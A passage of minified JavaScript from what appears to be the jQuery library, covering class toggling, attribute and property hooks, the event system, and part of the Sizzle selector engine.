a=="string"||a===b){c=(a||"").split(p);for(d=0,e=this.length;d<e;d++){g=this[d];if(g.nodeType===1&&g.className)if(a){h=(" "+g.className+" ").replace(o," ");for(i=0,j=c.length;i<j;i++)h=h.replace(" "+c[i]+" "," ");g.className=f.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b=="boolean";if(f.isFunction(a))return this.each(function(c){f(this).toggleClass(a.call(this,c,this.className,b),b)});return this.each(function(){if(c==="string"){var e,g=0,h=f(this),i=b,j=a.split(p);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?"addClass":"removeClass"](e)}else if(c==="undefined"||c==="boolean")this.className&&f._data(this,"__className__",this.className),this.className=this.className||a===!1?"":f._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ",c=0,d=this.length;for(;c<d;c++)if(this[c].nodeType===1&&(" "+this[c].className+" ").replace(o," ").indexOf(b)>-1)return!0;return!1},val:function(a){var c,d,e,g=this[0];{if(!!arguments.length){e=f.isFunction(a);return this.each(function(d){var g=f(this),h;if(this.nodeType===1){e?h=a.call(this,d,g.val()):h=a,h==null?h="":typeof h=="number"?h+="":f.isArray(h)&&(h=f.map(h,function(a){return a==null?"":a+""})),c=f.valHooks[this.nodeName.toLowerCase()]||f.valHooks[this.type];if(!c||!("set"in c)||c.set(this,h,"value")===b)this.value=h}})}if(g){c=f.valHooks[g.nodeName.toLowerCase()]||f.valHooks[g.type];if(c&&"get"in c&&(d=c.get(g,"value"))!==b)return d;d=g.value;return typeof d=="string"?d.replace(q,""):d==null?"":d}}}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c,d,e,g=a.selectedIndex,h=[],i=a.options,j=a.type==="select-one";if(g<0)return null;c=j?g:0,d=j?g+1:i.length;for(;c<d;c++){e=i[c];if(e.selected&&(f.support.optDisabled?!e.disabled:e.getAttribute("disabled")===null)&&(!e.parentNode.disabled||!f.nodeName(e.parentNode,"optgroup"))){b=f(e).val();if(j)return b;h.push(b)}}if(j&&!h.length&&i.length)return f(i[g]).val();return h},set:function(a,b){var c=f.makeArray(b);f(a).find("option").each(function(){this.selected=f.inArray(f(this).val(),c)>=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attr:function(a,c,d,e){var g,h,i,j=a.nodeType;if(!!a&&j!==3&&j!==8&&j!==2){if(e&&c in f.attrFn)return f(a)[c](d);if(typeof a.getAttribute=="undefined")return f.prop(a,c,d);i=j!==1||!f.isXMLDoc(a),i&&(c=c.toLowerCase(),h=f.attrHooks[c]||(u.test(c)?x:w));if(d!==b){if(d===null){f.removeAttr(a,c);return}if(h&&"set"in h&&i&&(g=h.set(a,d,c))!==b)return g;a.setAttribute(c,""+d);return d}if(h&&"get"in h&&i&&(g=h.get(a,c))!==null)return g;g=a.getAttribute(c);return g===null?b:g}},removeAttr:function(a,b){var c,d,e,g,h=0;if(b&&a.nodeType===1){d=b.toLowerCase().split(p),g=d.length;for(;h<g;h++)e=d[h],e&&(c=f.propFix[e]||e,f.attr(a,e,""),a.removeAttribute(v?e:c),u.test(e)&&c in a&&(a[c]=!1))}},attrHooks:{type:{set:function(a,b){if(r.test(a.nodeName)&&a.parentNode)f.error("type property can't be changed");else if(!f.support.radioValue&&b==="radio"&&f.nodeName(a,"input")){var c=a.value;a.setAttribute("type",b),c&&(a.value=c);return b}}},value:{get:function(a,b){if(w&&f.nodeName(a,"button"))return w.get(a,b);return b in a?a.value:null},set:function(a,b,c){if(w&&f.nodeName(a,"button"))return w.set(a,b,c);a.value=b}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e,g,h,i=a.nodeType;if(!!a&&i!==3&&i!==8&&i!==2){h=i!==1||!f.isXMLDoc(a),h&&(c=f.propFix[c]||c,g=f.propHooks[c]);return d!==b?g&&"set"in g&&(e=g.set(a,d,c))!==b?e:a[c]=d:g&&"get"in g&&(e=g.get(a,c))!==null?e:a[c]}},propHooks:{tabIndex:{get:function(a){var c=a.getAttributeNode("tabindex");return c&&c.specified?parseInt(c.value,10):s.test(a.nodeName)||t.test(a.nodeName)&&a.href?0:b}}}}),f.attrHooks.tabindex=f.propHooks.tabIndex,x={get:function(a,c){var d,e=f.prop(a,c);return e===!0||typeof e!="boolean"&&(d=a.getAttributeNode(c))&&d.nodeValue!==!1?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&&(a[d]=!0),a.setAttribute(c,c.toLowerCase()));return c}},v||(y={name:!0,id:!0},w=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&&(y[c]?d.nodeValue!=="":d.specified)?d.nodeValue:b},set:function(a,b,d){var e=a.getAttributeNode(d);e||(e=c.createAttribute(d),a.setAttributeNode(e));return e.nodeValue=b+""}},f.attrHooks.tabindex.set=w.set,f.each(["width","height"],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===""){a.setAttribute(b,"auto");return c}}})}),f.attrHooks.contenteditable={get:w.get,set:function(a,b,c){b===""&&(b="false"),w.set(a,b,c)}}),f.support.hrefNormalized||f.each(["href","src","width","height"],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex);return null}})),f.support.enctype||(f.propFix.enctype="encoding"),f.support.checkOn||f.each(["radio","checkbox"],function(){f.valHooks[this]={get:function(a){return a.getAttribute("value")===null?"on":a.value}}}),f.each(["radio","checkbox"],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)>=0}})});var z=/^(?:textarea|input|select)$/i,A=/^([^\.]*)?(?:\.(.+))?$/,B=/\bhover(\.\S+)?\b/,C=/^key/,D=/^(?:mouse|contextmenu)|click/,E=/^(?:focusinfocus|focusoutblur)$/,F=/^(\w*)(?:#([\w\-]+))?(?:\.([\w\-]+))?$/,G=function(a){var b=F.exec(a);b&&(b[1]=(b[1]||"").toLowerCase(),b[3]=b[3]&&new RegExp("(?:^|\\s)"+b[3]+"(?:\\s|$)"));return b},H=function(a,b){var c=a.attributes||{};return(!b[1]||a.nodeName.toLowerCase()===b[1])&&(!b[2]||(c.id||{}).value===b[2])&&(!b[3]||b[3].test((c["class"]||{}).value))},I=function(a){return f.event.special.hover?a:a.replace(B,"mouseenter$1 mouseleave$1")};
f.event={add:function(a,c,d,e,g){var h,i,j,k,l,m,n,o,p,q,r,s;if(!(a.nodeType===3||a.nodeType===8||!c||!d||!(h=f._data(a)))){d.handler&&(p=d,d=p.handler),d.guid||(d.guid=f.guid++),j=h.events,j||(h.events=j={}),i=h.handle,i||(h.handle=i=function(a){return typeof f!="undefined"&&(!a||f.event.triggered!==a.type)?f.event.dispatch.apply(i.elem,arguments):b},i.elem=a),c=f.trim(I(c)).split(" ");for(k=0;k<c.length;k++){l=A.exec(c[k])||[],m=l[1],n=(l[2]||"").split(".").sort(),s=f.event.special[m]||{},m=(g?s.delegateType:s.bindType)||m,s=f.event.special[m]||{},o=f.extend({type:m,origType:l[1],data:e,handler:d,guid:d.guid,selector:g,quick:G(g),namespace:n.join(".")},p),r=j[m];if(!r){r=j[m]=[],r.delegateCount=0;if(!s.setup||s.setup.call(a,e,n,i)===!1)a.addEventListener?a.addEventListener(m,i,!1):a.attachEvent&&a.attachEvent("on"+m,i)}s.add&&(s.add.call(a,o),o.handler.guid||(o.handler.guid=d.guid)),g?r.splice(r.delegateCount++,0,o):r.push(o),f.event.global[m]=!0}a=null}},global:{},remove:function(a,b,c,d,e){var g=f.hasData(a)&&f._data(a),h,i,j,k,l,m,n,o,p,q,r,s;if(!!g&&!!(o=g.events)){b=f.trim(I(b||"")).split(" ");for(h=0;h<b.length;h++){i=A.exec(b[h])||[],j=k=i[1],l=i[2];if(!j){for(j in o)f.event.remove(a,j+b[h],c,d,!0);continue}p=f.event.special[j]||{},j=(d?p.delegateType:p.bindType)||j,r=o[j]||[],m=r.length,l=l?new RegExp("(^|\\.)"+l.split(".").sort().join("\\.(?:.*\\.)?")+"(\\.|$)"):null;for(n=0;n<r.length;n++)s=r[n],(e||k===s.origType)&&(!c||c.guid===s.guid)&&(!l||l.test(s.namespace))&&(!d||d===s.selector||d==="**"&&s.selector)&&(r.splice(n--,1),s.selector&&r.delegateCount--,p.remove&&p.remove.call(a,s));r.length===0&&m!==r.length&&((!p.teardown||p.teardown.call(a,l)===!1)&&f.removeEvent(a,j,g.handle),delete o[j])}f.isEmptyObject(o)&&(q=g.handle,q&&(q.elem=null),f.removeData(a,["events","handle"],!0))}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){if(!e||e.nodeType!==3&&e.nodeType!==8){var h=c.type||c,i=[],j,k,l,m,n,o,p,q,r,s;if(E.test(h+f.event.triggered))return;h.indexOf("!")>=0&&(h=h.slice(0,-1),k=!0),h.indexOf(".")>=0&&(i=h.split("."),h=i.shift(),i.sort());if((!e||f.event.customEvent[h])&&!f.event.global[h])return;c=typeof c=="object"?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.isTrigger=!0,c.exclusive=k,c.namespace=i.join("."),c.namespace_re=c.namespace?new RegExp("(^|\\.)"+i.join("\\.(?:.*\\.)?")+"(\\.|$)"):null,o=h.indexOf(":")<0?"on"+h:"";if(!e){j=f.cache;for(l in j)j[l].events&&j[l].events[h]&&f.event.trigger(c,d,j[l].handle.elem,!0);return}c.result=b,c.target||(c.target=e),d=d!=null?f.makeArray(d):[],d.unshift(c),p=f.event.special[h]||{};if(p.trigger&&p.trigger.apply(e,d)===!1)return;r=[[e,p.bindType||h]];if(!g&&!p.noBubble&&!f.isWindow(e)){s=p.delegateType||h,m=E.test(s+h)?e:e.parentNode,n=null;for(;m;m=m.parentNode)r.push([m,s]),n=m;n&&n===e.ownerDocument&&r.push([n.defaultView||n.parentWindow||a,s])}for(l=0;l<r.length&&!c.isPropagationStopped();l++)m=r[l][0],c.type=r[l][1],q=(f._data(m,"events")||{})[c.type]&&f._data(m,"handle"),q&&q.apply(m,d),q=o&&m[o],q&&f.acceptData(m)&&q.apply(m,d)===!1&&c.preventDefault();c.type=h,!g&&!c.isDefaultPrevented()&&(!p._default||p._default.apply(e.ownerDocument,d)===!1)&&(h!=="click"||!f.nodeName(e,"a"))&&f.acceptData(e)&&o&&e[h]&&(h!=="focus"&&h!=="blur"||c.target.offsetWidth!==0)&&!f.isWindow(e)&&(n=e[o],n&&(e[o]=null),f.event.triggered=h,e[h](),f.event.triggered=b,n&&(e[o]=n));return c.result}},dispatch:function(c){c=f.event.fix(c||a.event);var d=(f._data(this,"events")||{})[c.type]||[],e=d.delegateCount,g=[].slice.call(arguments,0),h=!c.exclusive&&!c.namespace,i=[],j,k,l,m,n,o,p,q,r,s,t;g[0]=c,c.delegateTarget=this;if(e&&!c.target.disabled&&(!c.button||c.type!=="click")){m=f(this),m.context=this.ownerDocument||this;for(l=c.target;l!=this;l=l.parentNode||this){o={},q=[],m[0]=l;for(j=0;j<e;j++)r=d[j],s=r.selector,o[s]===b&&(o[s]=r.quick?H(l,r.quick):m.is(s)),o[s]&&q.push(r);q.length&&i.push({elem:l,matches:q})}}d.length>e&&i.push({elem:this,matches:d.slice(e)});for(j=0;j<i.length&&!c.isPropagationStopped();j++){p=i[j],c.currentTarget=p.elem;for(k=0;k<p.matches.length&&!c.isImmediatePropagationStopped();k++){r=p.matches[k];if(h||!c.namespace&&!r.namespace||c.namespace_re&&c.namespace_re.test(r.namespace))c.data=r.data,c.handleObj=r,n=((f.event.special[r.origType]||{}).handle||r.handler).apply(p.elem,g),n!==b&&(c.result=n,n===!1&&(c.preventDefault(),c.stopPropagation()))}}return c.result},props:"attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){a.which==null&&(a.which=b.charCode!=null?b.charCode:b.keyCode);return a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,d){var e,f,g,h=d.button,i=d.fromElement;a.pageX==null&&d.clientX!=null&&(e=a.target.ownerDocument||c,f=e.documentElement,g=e.body,a.pageX=d.clientX+(f&&f.scrollLeft||g&&g.scrollLeft||0)-(f&&f.clientLeft||g&&g.clientLeft||0),a.pageY=d.clientY+(f&&f.scrollTop||g&&g.scrollTop||0)-(f&&f.clientTop||g&&g.clientTop||0)),!a.relatedTarget&&i&&(a.relatedTarget=i===a.target?d.toElement:i),!a.which&&h!==b&&(a.which=h&1?1:h&2?3:h&4?2:0);return a}},fix:function(a){if(a[f.expando])return a;var d,e,g=a,h=f.event.fixHooks[a.type]||{},i=h.props?this.props.concat(h.props):this.props;a=f.Event(g);for(d=i.length;d;)e=i[--d],a[e]=g[e];a.target||(a.target=g.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),a.metaKey===b&&(a.metaKey=a.ctrlKey);return h.filter?h.filter(a,g):a},special:{ready:{setup:f.bindReady},load:{noBubble:!0},focus:{delegateType:"focusin"},blur:{delegateType:"focusout"},beforeunload:{setup:function(a,b,c){f.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}},simulate:function(a,b,c,d){var e=f.extend(new f.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?f.event.trigger(e,null,b):f.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},f.event.handle=f.event.dispatch,f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},f.Event=function(a,b){if(!(this instanceof f.Event))return new f.Event(a,b);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?K:J):this.type=a,b&&f.extend(this,b),this.timeStamp=a&&a.timeStamp||f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=K;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=K;var a=this.originalEvent;!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=K,this.stopPropagation()},isDefaultPrevented:J,isPropagationStopped:J,isImmediatePropagationStopped:J},f.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){f.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c=this,d=a.relatedTarget,e=a.handleObj,g=e.selector,h;if(!d||d!==c&&!f.contains(c,d))a.type=e.origType,h=e.handler.apply(this,arguments),a.type=b;return h}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(){if(f.nodeName(this,"form"))return!1;f.event.add(this,"click._submit keypress._submit",function(a){var c=a.target,d=f.nodeName(c,"input")||f.nodeName(c,"button")?c.form:b;d&&!d._submit_attached&&(f.event.add(d,"submit._submit",function(a){this.parentNode&&!a.isTrigger&&f.event.simulate("submit",this.parentNode,a,!0)}),d._submit_attached=!0)})},teardown:function(){if(f.nodeName(this,"form"))return!1;f.event.remove(this,"._submit")}}),f.support.changeBubbles||(f.event.special.change={setup:function(){if(z.test(this.nodeName)){if(this.type==="checkbox"||this.type==="radio")f.event.add(this,"propertychange._change",function(a){a.originalEvent.propertyName==="checked"&&(this._just_changed=!0)}),f.event.add(this,"click._change",function(a){this._just_changed&&!a.isTrigger&&(this._just_changed=!1,f.event.simulate("change",this,a,!0))});return!1}f.event.add(this,"beforeactivate._change",function(a){var b=a.target;z.test(b.nodeName)&&!b._change_attached&&(f.event.add(b,"change._change",function(a){this.parentNode&&!a.isSimulated&&!a.isTrigger&&f.event.simulate("change",this.parentNode,a,!0)}),b._change_attached=!0)})},handle:function(a){var b=a.target;if(this!==b||a.isSimulated||a.isTrigger||b.type!=="radio"&&b.type!=="checkbox")return a.handleObj.handler.apply(this,arguments)},teardown:function(){f.event.remove(this,"._change");return z.test(this.nodeName)}}),f.support.focusinBubbles||f.each({focus:"focusin",blur:"focusout"},function(a,b){var d=0,e=function(a){f.event.simulate(b,a.target,f.event.fix(a),!0)};f.event.special[b]={setup:function(){d++===0&&c.addEventListener(a,e,!0)},teardown:function(){--d===0&&c.removeEventListener(a,e,!0)}}}),f.fn.extend({on:function(a,c,d,e,g){var h,i;if(typeof a=="object"){typeof c!="string"&&(d=c,c=b);for(i in a)this.on(i,c,d,a[i],g);return this}d==null&&e==null?(e=c,d=c=b):e==null&&(typeof c=="string"?(e=d,d=b):(e=d,d=c,c=b));if(e===!1)e=J;else if(!e)return this;g===1&&(h=e,e=function(a){f().off(a);return h.apply(this,arguments)},e.guid=h.guid||(h.guid=f.guid++));return this.each(function(){f.event.add(this,a,e,d,c)})},one:function(a,b,c,d){return this.on.call(this,a,b,c,d,1)},off:function(a,c,d){if(a&&a.preventDefault&&a.handleObj){var e=a.handleObj;f(a.delegateTarget).off(e.namespace?e.type+"."+e.namespace:e.type,e.selector,e.handler);return this}if(typeof a=="object"){for(var g in a)this.off(g,c,a[g]);return this}if(c===!1||typeof c=="function")d=c,c=b;d===!1&&(d=J);return this.each(function(){f.event.remove(this,a,d,c)})},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},live:function(a,b,c){f(this.context).on(a,this.selector,b,c);return this},die:function(a,b){f(this.context).off(a,this.selector||"**",b);return this},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return arguments.length==1?this.off(a,"**"):this.off(b,a,c)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f._data(this,"lastToggle"+a.guid)||0)%d;f._data(this,"lastToggle"+a.guid,e+1),c.preventDefault();return b[e].apply(this,arguments)||!1};e.guid=c;while(d<b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){f.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.on(b,null,a,c):this.trigger(b)},f.attrFn&&(f.attrFn[b]=!0),C.test(b)&&(f.event.fixHooks[b]=f.event.keyHooks),D.test(b)&&(f.event.fixHooks[b]=f.event.mouseHooks)}),function(){function x(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}if(j.nodeType===1){g||(j[d]=c,j.sizset=h);if(typeof b!="string"){if(j===b){k=!0;break}}else if(m.filter(b,[j]).length>0){k=j;break}}j=j[a]}e[h]=k}}}function w(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}j.nodeType===1&&!g&&(j[d]=c,j.sizset=h);if(j.nodeName.toLowerCase()===b){k=j;break}j=j[a]}e[h]=k}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d="sizcache"+(Math.random()+"").replace(".",""),e=0,g=Object.prototype.toString,h=!1,i=!0,j=/\\/g,k=/\r\n/g,l=/\W/;[0,0].sort(function(){i=!1;return 0});var m=function(b,d,e,f){e=e||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!="string")return e;var i,j,k,l,n,q,r,t,u=!0,v=m.isXML(d),w=[],x=b;do{a.exec(""),i=a.exec(x);if(i){x=i[3],w.push(i[1]);if(i[2]){l=i[3];break}}}while(i);if(w.length>1&&p.exec(b))if(w.length===2&&o.relative[w[0]])j=y(w[0]+w[1],d,f);else{j=o.relative[w[0]]?[d]:m(w.shift(),d);while(w.length)b=w.shift(),o.relative[b]&&(b+=w.shift()),j=y(b,j,f)}else{!f&&w.length>1&&d.nodeType===9&&!v&&o.match.ID.test(w[0])&&!o.match.ID.test(w[w.length-1])&&(n=m.find(w.shift(),d,v),d=n.expr?m.filter(n.expr,n.set)[0]:n.set[0]);if(d){n=f?{expr:w.pop(),set:s(f)}:m.find(w.pop(),w.length===1&&(w[0]==="~"||w[0]==="+")&&d.parentNode?d.parentNode:d,v),j=n.expr?m.filter(n.expr,n.set):n.set,w.length>0?k=s(j):u=!1;while(w.length)q=w.pop(),r=q,o.relative[q]?r=w.pop():q="",r==null&&(r=d),o.relative[q](k,r,v)}else k=w=[]}k||(k=j),k||m.error(q||b);if(g.call(k)==="[object Array]")if(!u)e.push.apply(e,k);else if(d&&d.nodeType===1)for(t=0;k[t]!=null;t++)k[t]&&(k[t]===!0||k[t].nodeType===1&&m.contains(d,k[t]))&&e.push(j[t]);else for(t=0;k[t]!=null;t++)k[t]&&k[t].nodeType===1&&e.push(j[t]);else s(k,e);l&&(m(l,h,e,f),m.uniqueSort(e));return e};m.uniqueSort=function(a){if(u){h=i,a.sort(u);if(h)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},m.matches=function(a,b){return m(a,null,null,b)},m.matchesSelector=function(a,b){return m(b,null,null,[a]).length>0},m.find=function(a,b,c){var d,e,f,g,h,i;if(!a)return[];for(e=0,f=o.order.length;e<f;e++){h=o.order[e];if(g=o.leftMatch[h].exec(a)){i=g[1],g.splice(1,1);if(i.substr(i.length-1)!=="\\"){g[1]=(g[1]||"").replace(j,""),d=o.find[h](g,b,c);if(d!=null){a=a.replace(o.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},m.filter=function(a,c,d,e){var f,g,h,i,j,k,l,n,p,q=a,r=[],s=c,t=c&&c[0]&&m.isXML(c[0]);while(a&&c.length){for(h in o.filter)if((f=o.leftMatch[h].exec(a))!=null&&f[2]){k=o.filter[h],l=f[1],g=!1,f.splice(1,1);if(l.substr(l.length-1)==="\\")continue;s===r&&(r=[]);if(o.preFilter[h]){f=o.preFilter[h](f,s,d,r,e,t);if(!f)g=i=!0;else if(f===!0)continue}if(f)for(n=0;(j=s[n])!=null;n++)j&&(i=k(j,f,n,s),p=e^i,d&&i!=null?p?g=!0:s[n]=!1:p&&(r.push(j),g=!0));if(i!==b){d||(s=r),a=a.replace(o.match[h],"");if(!g)return[];break}}if(a===q)if(g==null)m.error(a);else break;q=a}return s},m.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)};var n=m.getText=function(a){var b,c,d=a.nodeType,e="";if(d){if(d===1||d===9){if(typeof a.textContent=="string")return a.textContent;if(typeof a.innerText=="string")return a.innerText.replace(k,"");for(a=a.firstChild;a;a=a.nextSibling)e+=n(a)}else if(d===3||d===4)return a.nodeValue}else for(b=0;c=a[b];b++)c.nodeType!==8&&(e+=n(c));return e},o=m.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b=="string",d=c&&!l.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1);a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&m.filter(b,a,!0)},">":function(a,b){var c,d=typeof b=="string",e=0,f=a.length;if(d&&!l.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&m.filter(b,a,!0)}},"":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("parentNode",b,f,a,d,c)},"~":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("previousSibling",b,f,a,d,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(j,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(j,"")},TAG:function(a,b){return a[1].replace(j,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||m.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&m.error(a[0]);a[0]=e++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(j,"");!f&&o.attrMap[g]&&(a[1]=o.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(j,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=m(b[3],null,null,c);else{var g=m.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(o.match.POS.test(b[0])||o.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!m(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return a.nodeName.toLowerCase()==="input"&&"text"===c&&(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()==="input"&&"radio"===a.type},checkbox:function(a){return a.nodeName.toLowerCase()==="input"&&"checkbox"===a.type},file:function(a){return a.nodeName.toLowerCase()==="input"&&"file"===a.type},password:function(a){return a.nodeName.toLowerCase()==="input"&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"submit"===a.type},image:function(a){return a.nodeName.toLowerCase()==="input"&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b==="input"&&"button"===a.type||b==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var 